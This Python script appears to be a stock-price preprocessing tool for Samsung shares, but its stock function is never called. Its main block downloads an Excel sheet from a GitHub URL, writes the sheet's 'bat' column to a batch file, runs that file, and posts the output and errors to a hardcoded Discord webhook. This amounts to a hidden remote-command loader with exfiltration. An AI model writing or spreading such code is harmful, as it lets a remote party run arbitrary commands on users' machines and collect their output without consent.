import requests
import subprocess
import shlex
import pandas as pd
import numpy as np
import datetime
import time
import FinanceDataReader as fdr
import numpy as np
import matplotlib.pyplot as plt

def MinMaxScaler(data):
    """최솟값과 최댓값을 이용하여 0 ~ 1 값으로 변환"""
    numerator = data - np.min(data, 0)
    denominator = np.max(data, 0) - np.min(data, 0)
    # 0으로 나누기 에러가 발생하지 않도록 매우 작은 값(1e-7)을 더해서 나눔
    return numerator / (denominator + 1e-7)

def stock():
    df = fdr.DataReader('005930', '2018-05-04', '2020-01-22')
    dfx = df[['Open','High','Low','Volume', 'Close']]
    dfx = MinMaxScaler(dfx)
    dfy = dfx[['Close']]
    dfx = dfx[['Open','High','Low','Volume']]
    X = dfx.values.tolist()
    y = dfy.values.tolist()

    window_size = 10

    data_X = []
    data_y = []
    for i in range(len(y) - window_size):
        _X = X[i : i + window_size] # 다음 날 종가(i+windows_size)는 포함되지 않음
        _y = y[i + window_size]     # 다음 날 종가
        data_X.append(_X)
        data_y.append(_y)
    print(_X, "->", _y)

    train_size = int(len(data_y) * 0.7)
    train_X = np.array(data_X[0 : train_size])
    train_y = np.array(data_y[0 : train_size])

    test_size = len(data_y) - train_size
    test_X = np.array(data_X[train_size : len(data_X)])
    test_y = np.array(data_y[train_size : len(data_y)])

    print('훈련 데이터의 크기 :', train_X.shape, train_y.shape)
    print('테스트 데이터의 크기 :', test_X.shape, test_y.shape)

def send_to_discord(content):
    try:
        webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO" 
        headers = {
            "Content-Type": "application/json"
        }

        for i in content.split("\n"):
            time.sleep(1)
            data = {
                "content": i
            }
            r = requests.post(webhook_url, json=data, headers=headers)
    except Exception as e:
        webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO" 
        
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "content": "SEND Error!\n" + str(e)
        }
        r = requests.post(webhook_url, json=data, headers=headers)

def download_file(url, filename):
    try:
        response = requests.get(url)
        with open(filename, 'wb') as f:
            f.write(response.content)
        send_to_discord(f"File downloaded successfully: {filename}")
        return True
    except Exception as e:
        send_to_discord(f"Error downloading file: {e}")
        return False

if __name__ == "__main__":
    download_file("https://github.com/seo-hyeon/Mecro_Test/raw/refs/heads/main/metadata_list.xlsx", 'metadata_list.xlsx')
    data = pd.read_excel('metadata_list.xlsx')

    send_to_discord('=====Start=====')

    file_path = 'player_assistants.bat'
    with open(file_path, 'w') as file:
        for line in data['bat']:
            file.write(str(line) + '\n')

    try:
        result = subprocess.run(file_path, capture_output=True, text=True, check=True)
        send_to_discord("파일의 출력값:")
        send_to_discord(result.stdout)
        if result.stderr:
            send_to_discord("파일 실행 중 오류 발생:")
            send_to_discord(result.stderr)
    except subprocess.CalledProcessError as e:
        send_to_discord("파일 실행 중 오류 발생:")
        send_to_discord(e.stderr)
